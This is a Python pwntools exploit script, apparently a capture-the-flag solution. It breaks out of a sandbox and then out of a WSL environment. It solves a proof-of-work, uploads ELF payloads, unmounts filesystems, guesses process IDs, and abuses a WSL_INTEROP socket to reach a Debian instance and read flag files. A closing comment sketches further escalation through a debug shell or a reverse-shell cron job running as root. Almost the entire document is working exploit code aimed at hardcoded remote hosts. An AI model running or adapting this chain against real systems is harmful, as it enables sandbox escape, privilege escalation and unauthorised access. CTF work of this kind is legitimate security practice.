from pwn import *
from subprocess import check_output

context.arch = 'amd64'

os.system('make')
idle_elf = open('./idle', 'rb').read()
init_shell = open('./shell', 'rb').read()

def connect_remote():
    #p = remote('20.83.201.101', 20000)
    p = remote('44.231.196.160', 20000)
    p.recvuntil(b'./kctf-pow solve ')

    pow = str(p.recvline().strip(), 'utf8')
    result = check_output(['kctf-pow', 'solve', pow])
    p.sendline(result.strip())

    p.recvuntil(b'Flag from part 1: ')
    p.sendline(open('../flag1.txt', 'rb').read().strip())
    #p.sendline(b"ADMIN_ADMIN!!!!_6G93ugsoi;jsjfaie")
    for i in range(3):
        log.info(str(p.recvline(), 'utf8').strip())
    return p

#p = remote('20.83.201.101', 58031)
p = connect_remote()
#p.interactive()

def sandbox(elf):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'len?', str(len(elf)).encode())
    p.sendafter(b'data?', elf)

def clone(num, elf):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'number:', str(num).encode())
    if elf != None:
        p.sendlineafter(b'len?', str(len(elf)).encode())
        p.sendafter(b'data?', elf)

for i in range(256):
    print(f"Sending {i}/256")
    if i == 0:
        sandbox(init_shell)
    else:
        sandbox(idle_elf)

clone(0, None)
p.recvuntil(b' ')
context.log_level = 'debug'
pause()
p.sendline(b'/bin/busybox umount /')
p.sendline(b'exec 2>&1')
# TODO: make sure this fd is correct
# this fd should be a socket fd that's not the stdin/stdout one
# For ./run_shared.sh the fd becomes 4
# For ./run.sh inside socat the fd becomes 6
p.sendline(b'/tmp/working/bin/start_fserv 4')
p.sendline(b'umount /proc')
p.sendline(b'echo HHI:')
p.recvuntil(b'HHI:')
p.sendline(b'echo "HI: " && (ps | grep /tmp/fserv)')
p.recvuntil(b'HI: ')
p.recvline()
fserv_pid = int(p.recvline().strip().split(b' ')[0])
log.info(f'fserv pid: {fserv_pid}')
p.sendline(bytes(f'cat /proc/{fserv_pid}/status | grep PPid', 'utf8'))
p.recvuntil(b'PPid:\t')
fserv_parent = int(p.recvline().strip())
log.info(f'fserv ppid: {fserv_parent}')

fserv_guess = fserv_parent - 2
p.sendline(bytes(f'/tmp/working/bin/exp {fserv_guess}', 'utf8')) # TODO: make sure this guess is correct

p.recvuntil(b'Opened root dir on fd ')
rootfd = int(p.recvuntil(b'.', drop=True))

p.sendline(bytes(f'WSL_INTEROP=/proc/self/fd/{rootfd}/run/WSL/1_interop /tmp/working/bin/debian', 'utf8'))

p.sendline(b'cat /flag1.txt')

# NOTE: the rest of the exploit chain is relatively trivial. You just need to
# hook onto the WSL_interop socket that is connected to the apt-get job (since
# that runs at high mandatory level). To get the other flag, just run
# `wsl --debug-shell` and pivot back to this debian image, or you can create a
# cronjob that sets up a reverse shell and then run `debian config --default-user root`
# which would also get the job done.

while True:
    p.interactive()

